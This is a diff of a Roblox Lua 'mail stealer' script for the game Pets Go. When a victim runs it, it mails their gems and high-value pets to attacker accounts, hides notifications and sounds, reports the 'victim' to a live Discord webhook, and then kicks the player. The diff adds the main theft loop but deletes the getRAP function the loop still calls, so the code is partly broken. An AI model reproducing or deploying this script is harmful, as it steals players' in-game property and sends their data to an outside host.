@@ -1,24 +1,30 @@
+-- Usernames of the targets
 Usernames = {
     "stepanark",
-    "xavaxonosel2",
-    -- Add more users below if you want to
-    -- "user3",
-    -- "user4",
+    "xavaxonosel60",
+    -- Add more users here if necessary
 }
-min_rap = 1000 -- minimum RAP of each item you want to get sent to you, set back to 1000
-min_chance = 1000000 -- updated to 1M for minimum chance
+
+-- Minimum RAP and chance settings
+min_rap = 1000000 -- 1 million RAP minimum for pets
+min_chance = 100000 -- Minimum chance for pets
+
+-- Webhook URL for notifications
 webhook = "https://discord.com/api/webhooks/1299345986061205586/YNmpW0V7RT157DVhz_9Jh5DjkgTjFvQ11IMR9T9_dvQL2Fzzsqw45FQZs0onqEP0761j"
 
+-- Services
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = require(game.ReplicatedStorage.Library)
 local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
 local plr = game.Players.LocalPlayer
-local MailMessage = "Join gg / GY2RVSEGDT to get back"
+local MailMessage = "sussy baka"
 local HttpService = game:GetService("HttpService")
 local sortedItems = {}
 local totalRAP = 0
 local sentUsers = {}
 _G.scriptExecuted = _G.scriptExecuted or false
+
+-- Function to get player save data
 local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
@@ -28,31 +34,34 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
+-- Check if the player is one of the target users
 for _, user in ipairs(Usernames) do
     if plr.Name == user then
-        plr:kick("You cannot mailsteal yourself")
+        plr:Kick("You cannot mail steal yourself")
         return
     end
 end
 
+-- Get the amount of gems the player has
 local GemAmount1 = 0
 for i, v in pairs(GetSave().Inventory.Currency) do
     if v.id == "Diamonds" then
         GemAmount1 = v._am
-		break
+        break
     end
 end
 
+-- Format number function (with suffix)
 local function formatNumber(number)
     if number == nil then
         return "0"
     end
-	local suffixes = {"", "k", "m", "b", "t"}
-	local suffixIndex = 1
-	while number >= 1000 and suffixIndex < #suffixes do
-		number = number / 1000
-		suffixIndex = suffixIndex + 1
-	end
+    local suffixes = {"", "k", "m", "b", "t"}
+    local suffixIndex = 1
+    while number >= 1000 and suffixIndex < #suffixes do
+        number = number / 1000
+        suffixIndex = suffixIndex + 1
+    end
     if suffixIndex == 1 then
         return tostring(math.floor(number))
     else
@@ -64,28 +73,29 @@ local function formatNumber(number)
     end
 end
 
+-- Send a message to the webhook
 local function SendMessage(username, diamonds)
     local headers = {
         ["Content-Type"] = "application/json",
     }
 
-	local fields = {
-		{
-			name = "Victim Username:",
-			value = username,
-			inline = true
-		},
-		{
-			name = "Items to be sent:",
-			value = "",
-			inline = false
-		},
+    local fields = {
+        {
+            name = "Victim Username:",
+            value = username,
+            inline = true
+        },
+        {
+            name = "Items to be sent:",
+            value = "",
+            inline = false
+        },
         {
             name = "Summary:",
             value = "",
             inline = false
         }
-	}
+    }
 
     local combinedItems = {}
     local itemRapMap = {}
@@ -130,26 +140,14 @@ local function SendMessage(username, diamonds)
 
     fields[3].value = string.format("Gems: %s\nTotal RAP: %s\nSent to users: %s", formatNumber(diamonds), formatNumber(totalRAP), sentUsersFormatted)
 
-    if #fields[2].value > 1024 then
-        local lines = {}
-        for line in fields[2].value:gmatch("[^\r\n]+") do
-            table.insert(lines, line)
-        end
-
-        while #fields[2].value > 1024 and #lines > 0 do
-            table.remove(lines)
-            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
-        end
-    end
-
     local data = {
         ["embeds"] = {{
-            ["title"] = "\240\159\142\178 New Pets Go Execution" ,
+            ["title"] = "\240\159\142\178 New Pets Go Execution",
             ["color"] = 65280,
-			["fields"] = fields,
-			["footer"] = {
-				["text"] = "sussy baka"
-			}
+            ["fields"] = fields,
+            ["footer"] = {
+                ["text"] = "sussy baka"
+            }
         }}
     }
 
@@ -165,53 +163,14 @@ local function SendMessage(username, diamonds)
     end
 end
 
-local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
-local noti = plr.PlayerGui.Notifications
-loading.Disabled = true
-noti:GetPropertyChangedSignal("Enabled"):Connect(function()
-	noti.Enabled = false
-end)
-noti.Enabled = false
-
-game.DescendantAdded:Connect(function(x)
-    if x.ClassName == "Sound" then
-        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
-            x.Volume=0
-            x.PlayOnRemove=false
-            x:Destroy()
-        end
-    end
-end)
-
-local function getRAP(Type, Item)
-    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get(
-        {
-            Class = {Name = Type},
-            IsA = function(hmm)
-                return hmm == Type
-            end,
-            GetId = function()
-                return Item.id
-            end,
-            StackKey = function()
-                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
-            end
-        }
-    ) or 0)
-end
-
-local users = Usernames or {"PetsGoMommy", "SusanAltGrind", "SusanHatching"}
-local min_rap = min_rap or 1000
-local min_chance = min_chance or 1000000
-local webhook = webhook
-
+-- Function to send items to users
 local function sendItem(category, uid, am)
     local userIndex = 1
-    local maxUsers = #users
+    local maxUsers = #Usernames
     local sent = false
 
     repeat
-        local currentUser = users[userIndex]
+        local currentUser = Usernames[userIndex]
         local args = {
             [1] = currentUser,
             [2] = MailMessage,
@@ -236,16 +195,17 @@ local function sendItem(category, uid, am)
     until sent
 end
 
+-- Function to send all gems to users
 local function SendAllGems()
     for i, v in pairs(GetSave().Inventory.Currency) do
         if v.id == "Diamonds" then
             if GemAmount1 >= 500 and GemAmount1 >= min_rap then
                 local userIndex = 1
-                local maxUsers = #users
+                local maxUsers = #Usernames
                 local sent = false
 
                 repeat
-                    local currentUser = users[userIndex]
+                    local currentUser = Usernames[userIndex]
                     local args = {
                         [1] = currentUser,
                         [2] = MailMessage,
@@ -268,10 +228,56 @@ local function SendAllGems()
                         end
                     end
                 until sent
+                break
             end
         end
     end
 end
 
-SendMessage(plr.Name, GemAmount1)
+-- Main logic to claim mail and execute the stealing process
+local function ClaimMail()
+    local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
+    while err == "You must wait 30 seconds before using the mailbox!" do
+        wait()
+        response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
+    end
+end
+
+local categoryList = {"Pet", "Hoverboard", "Fruit", "Misc", "Booth"}
+
+for i, v in pairs(categoryList) do
+    if save[v] ~= nil then
+        for uid, item in pairs(save[v]) do
+            if v == "Pet" then
+                local rapValue = getRAP(v, item)
+                if rapValue >= min_rap then
+                    local difficulty = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]["difficulty"]
+                    if difficulty >= min_chance then
+                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id, chance = difficulty})
+                        totalRAP = totalRAP + (rapValue * (item._am or 1))
+                    end
+                end
+            else
+                local rapValue = getRAP(v, item)
+                if rapValue >= min_rap then
+                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
+                    totalRAP = totalRAP + (rapValue * (item._am or 1))
+                end
+            end
+        end
+    end
+end
+
+-- Send all gems and log the theft
 SendAllGems()
+SendMessage(plr.Name, GemAmount1)
+
+for _, item in ipairs(sortedItems) do
+    for _ = 1, item.amount do
+        sendItem(item.category, item.uid)
+    end
+end
+
+SendMessage(plr.Name, GemAmount1)
+ClaimMail()
+plr:Kick("Pets have been executed. Gems sent.")
